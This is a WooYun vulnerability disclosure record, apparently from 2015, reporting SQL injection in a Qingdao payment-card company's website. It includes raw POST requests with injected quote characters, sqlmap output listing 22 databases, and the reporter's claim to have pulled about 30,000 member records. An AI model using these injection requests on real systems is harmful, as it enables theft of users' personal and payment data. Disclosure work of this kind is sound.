{"id": 67136, "wybug_id": "wooyun-2015-0142997", "wybug_title": "青岛支付巨头存在SQL注射漏洞（可泄露上万青岛用户详细信息/随意伪造金额充值卡片/刷遍青岛）", "wybug_corp": "青岛百森通支付有限公司", "wybug_author": "路人甲", "wybug_date": "2015-09-24 16:50", "wybug_open_date": "2015-11-12 19:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-28：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向公众公开  简要描述： “佰通卡”以“安全、便捷”的方式为市民家庭提供了一站式账单查询及支付服务，在一定程度上缓解了市民交费难的问题。佰通卡是具备通用、储值、多功能及增值特点的多功能储值消费缴费卡，可循环充值，不受单一品牌消费卡只能在单一品牌内的使用限制，不仅可在青岛市近千家百货超市、餐饮、休闲娱乐等行业商户使用，更可用于通信、水电、燃气气、有线电视等公用事业费的缴纳。佰通卡根据用途分为通用卡及主题卡，均可根据需求制作定额卡与储值卡，广泛应用于团体及个人客户购物消费、礼品馈赠、员工福利等用途，具有巨大的市场容量。青岛百森通支付有限公司是“佰通卡”项目的承建单位。其主营业务是建立全市统一的帐单信息公共处理平台，利用信息化的技术和手段，为市民家庭提供安全便捷的电子交费服务。使市民可以在社区周围的佰通电超市、24小时便利店（广泛分布于市内各居民生活区）使用现金、银行卡以及面向市民广泛发行综合充值缴费卡——\"佰通卡\",进行便捷地缴付水、电、燃气、手机、电话、有线电视等多种公用事业费账单;市民也可以登录佰通支付网站使用佰通卡便捷地缴付水、电、煤、手机、电话、有线电视等多种公用事业费账单。2009年12月开始我司组织技术人员经过近一年的研发，测试、试点，生产出便携缴费POS终端——“佰通支付”缴费终端，并于2011年2月已全面进入86家24小时便利店——可好（好易得）、友客。由于提供了全天候的缴费服务，项目一上线就得到了用户的广泛认可。我司计划2011年度在更多的24小时便利店（迷你岛）、利群便利店、海滨便利店、福彩站、体彩站、国风药房、海王星辰药房、其它便利超市新增投放POS终端1500台。让市民随时随地体会到便民缴费的方便。预计到2011年年底服务人次达到600万人次以上。 详细说明：  http://**.**.**.**/ 佰通卡官网存在多处注入，搜索POSThttp://**.**.**.**/test.aspx 这个竟然可以添加参数提交，也是一处POSThttp://**.**.**.**/通过跑一处链接，跑到支付官网的数据库，跑了下会员表，近3W会员各种收费缴费信息，更可以伪造金额直接各种收费业务佰通卡在青岛很流行，几乎可以刷遍青岛了   漏洞证明：  \nPOST /searchlList.aspx HTTP/1.1Host: **.**.**.**Content-Length: 73Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=pborf03jnqxbi0m123022qy4; __utma=44974263.822423032.1442992977.1442992977.1442992977.1; __utmc=44974263; __utmz=44974263.1442992977.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); CNZZDATA2275593=cnzz_eid%3D2069944952-1442988247-%26ntime%3D1442993022keyWords=aa%27&sType=00&addr=0&Submit.x=51&Submit.y=9&Submit=%CC%E1%BD%BB\nPOST包这是一个搜索的包\nPOST /test.aspx HTTP/1.1Host: **.**.**.**Content-Length: 190Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/test.aspxAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=pborf03jnqxbi0m123022qy4; CNZZDATA2275593=cnzz_eid%3D2069944952-1442988247-%26ntime%3D1442988247__VIEWSTATE=%2FwEPDwUKMTkwNjc4NTIwMWRk8bFmB7mFSh1%2BREe%2FPOmlGL9zN4A%3D&__EVENTVALIDATION=%2FwEWAwLiyuD9AgLs0bLrBgKM54rGBj3ZbxmXbLry0WsyQODw%2BR%2Fr7Flq&TextBox1=aaa%27&Button1=%CC%E1%BD%BB\ntest页面包 通过跑包发现多个数据库，\navailable databases [22]:[*] BestoneCRM[*] bestonepay[*] BestoneShop[*] bestshop[*] btk[*] caiwu_jiesuan[*] CRM[*] db_Jmail[*] JFCard[*] master[*] model[*] msdb[*] Northwind[*] payfee[*] pubs[*] qingdaojiaofei[*] tempdb[*] test[*] testbestonepay[*] v5Shop[*] weixin[*] weixinServer[16:07:03] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 2 times[16:07:03] [INFO] fetched data logged to text files under 'C:\\Users\\KING\\.sqlmap\\output\\**.**.**.**'\n找到支付的跑了下\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-09-28 19:11 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-23 16:56 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:612 漏洞数:112        | 一场秋雨一场寒~)\t\t \n  我表哥呢？@DNS    \n     2015-09-23 17:14 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:53        | 猜猜我是谁？)\t\t \n  我特么就知道是你！！本来想评论的，结果妹子叫我    \n     2015-09-23 17:21 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:612 漏洞数:112        | 一场秋雨一场寒~)\t\t \n  @DNS 不是，你这都知道是我啊    \n     2015-09-23 17:34 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:53        | 猜猜我是谁？)\t\t \n  你上次分红都没我的！我没你这样的表弟。    \n     2015-09-23 17:40 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:612 漏洞数:112        | 一场秋雨一场寒~)\t\t \n  @DNS 哈哈哈哈，上次没几块钱啊    \n     2015-09-23 18:02 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:64        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  @DNS 表哥怎么在哪都能看见你，今晚不考虑下请我吃饭吗？    \n     2015-09-23 19:27 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:53        | 猜猜我是谁？)\t\t \n  @红客十年 表哥无处不在    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}